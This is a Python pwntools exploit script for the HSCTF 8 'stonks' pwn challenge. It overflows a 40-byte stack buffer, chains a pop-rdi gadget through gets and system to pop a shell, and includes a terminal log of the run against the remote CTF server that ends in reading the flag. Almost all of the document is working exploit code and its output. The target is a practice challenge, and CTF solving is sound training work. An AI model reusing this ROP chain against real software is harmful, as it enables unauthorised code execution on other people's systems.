from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './chal'
elf  = ELF(BINARY)

pop_rdi_ret = 0x401363 # pop rdi; ret;

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "stonks.hsc.tf"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("Please enter the stock ticker symbol: ")

buf  = b"A"*40
buf += p64(pop_rdi_ret)
buf += p64(0x404100)
buf += p64(elf.plt.gets)
buf += p64(pop_rdi_ret)
buf += p64(0x404100)
buf += p64(elf.plt.system)
s.sendline(buf)

sleep(0.5)
s.sendline(b"/bin/sh\x00")

s.interactive()

'''
mito@ubuntu:~/CTF/HSCTF_8/Pwn_stonks$ python3 solve.py r
[*] '/home/mito/CTF/HSCTF_8/Pwn_stonks/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to stonks.hsc.tf on port 1337: Done
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x03will increase by $3 today!
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ cat flag
flag{to_the_moon}
'''
